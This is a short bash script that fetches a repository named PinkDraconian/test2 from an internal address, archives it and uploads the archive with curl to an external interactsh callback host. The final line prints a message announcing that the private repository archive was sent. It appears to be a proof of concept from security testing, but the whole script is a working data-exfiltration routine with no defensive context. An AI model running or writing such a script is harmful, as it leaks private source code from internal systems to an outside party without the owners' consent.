#!/bin/bash
set -eu

interactsh_host='hvzmfsikykidlrxxlvrbaskau5je7uxtj.oast.fun'
temporary_directory="$(mktemp -d)"
trap 'rm -rf "$temporary_directory"' EXIT

git -C "$temporary_directory" init -q

timeout 20 git -C "$temporary_directory" fetch --depth=1 -q \
  http://git@192.168.0.1:8080/PinkDraconian/test2 \
  main

archive="$temporary_directory/test2-main.tar.gz"

git -C "$temporary_directory" archive \
  --format=tar.gz \
  -o "$archive" \
  FETCH_HEAD

curl --fail --silent --show-error --max-time 20 \
  -H 'Content-Type: application/gzip' \
  --data-binary "@$archive" \
  "https://${interactsh_host}/test2-main.tar.gz" \
  >/dev/null

echo PRIVATE_REPOSITORY_ARCHIVE_SENT
